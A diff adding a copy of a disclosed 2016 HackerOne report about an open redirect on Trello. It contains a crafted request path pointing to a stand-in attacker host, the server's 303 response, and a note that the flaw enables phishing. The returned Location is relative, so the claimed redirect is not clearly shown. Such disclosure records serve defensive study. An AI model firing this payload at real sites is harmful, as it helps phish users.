@@ -1,0 +1,38 @@
+ReportLink:https://hackerone.com/reports/172363
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/tgpanackal
+ReportedTo:Trello(trello)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:27.09.2016 17:02:59
+
+Summary:
+
+Poc:
+1.Edit the HTTP request of https://trello.com in BURP SUITE:
+Edit the HTTP REQUEST to:
+```
+GET //www.attacker.com/%2f%2e%2e HTTP/1.1
+Host: trello.com
+```
+HTTP Response
+```
+HTTP/1.1 303 See Other
+Cache-Control: no-store, no-cache
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=15768000
+X-XSS-Protection: 1; mode=block
+X-FRAME-OPTIONS: DENY
+X-Trello-Version: 1.763.0
+X-Trello-Environment: Production
+Content-Type: text/html; charset=utf-8
+Location: /www.attacker.com/%2f%2e%2e/
+Vary: Accept-Encoding
+Date: Tue, 27 Sep 2016 10:15:36 GMT
+Connection: close
+
+Redirecting to <a href="/www.attacker.com/%2f%2e%2e/">/www.attacker.com/%2f%2e%2e/</a>
+```
+Inspect the HTTP Response and you will see the location is redirected to www.attacker.com(example)
+Attacker can use this Open Redirect vulnerability to implement phishing attackes on the website to get its users to visit malious sites/program without their knowledge.
